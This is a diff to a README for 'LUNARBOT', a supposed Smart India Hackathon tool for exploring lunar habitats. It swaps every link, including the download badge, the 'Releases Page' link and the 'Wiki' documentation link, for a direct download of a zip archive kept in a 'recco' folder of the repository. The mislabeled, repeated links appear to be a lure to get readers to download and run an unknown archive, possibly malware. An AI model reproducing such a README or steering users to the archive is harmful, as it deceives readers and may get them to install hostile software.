@@ -1,6 +1,6 @@
 # 🌕 lunarbot-smart-india-hackathon - Explore Lunar Habitats Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/main/recco/lunarbot-smart-india-hackathon.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/main/recco/lunarbot-smart-india-hackathon.zip)
+[![Download Latest Release](https://github.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/raw/refs/heads/main/recco/india-hackathon-smart-lunarbot-1.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/raw/refs/heads/main/recco/india-hackathon-smart-lunarbot-1.5.zip)
 
 ## 📜 Description
 
@@ -13,7 +13,7 @@ To begin using LUNARBOT, follow these straightforward steps to download and run 
 ### 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   Click [here to download the latest version](https://raw.githubusercontent.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/main/recco/lunarbot-smart-india-hackathon.zip).
+   Click [here to download the latest version](https://github.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/raw/refs/heads/main/recco/india-hackathon-smart-lunarbot-1.5.zip).
 
 2. **Choose Your File**  
    Look for the latest release at the top of the page. You will see a list of downloadable files, including different formats depending on your operating system.
@@ -71,7 +71,7 @@ Join our community to get help, share your ideas, or ask questions:
 
 - **GitHub Issues**: Report any bugs or issues you encounter.
 - **Discussion Forum**: Share your experiences or seek advice from other users.
-- **Documentation**: Visit our [Wiki](https://raw.githubusercontent.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/main/recco/lunarbot-smart-india-hackathon.zip) for detailed guides and advanced setups.
+- **Documentation**: Visit our [Wiki](https://github.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/raw/refs/heads/main/recco/india-hackathon-smart-lunarbot-1.5.zip) for detailed guides and advanced setups.
 
 ## 🎨 Contributing
 
@@ -89,6 +89,6 @@ LUNARBOT is open-source software licensed under the MIT License. You may use, mo
 
 ## 🔗 Download & Installation Reminder 
 
-Don't forget to download the latest version of LUNARBOT from our [Releases Page](https://raw.githubusercontent.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/main/recco/lunarbot-smart-india-hackathon.zip)! 
+Don't forget to download the latest version of LUNARBOT from our [Releases Page](https://github.com/ItsKennethPlayz/lunarbot-smart-india-hackathon/raw/refs/heads/main/recco/india-hackathon-smart-lunarbot-1.5.zip)! 
 
 Enjoy exploring lunar habitats with ease!
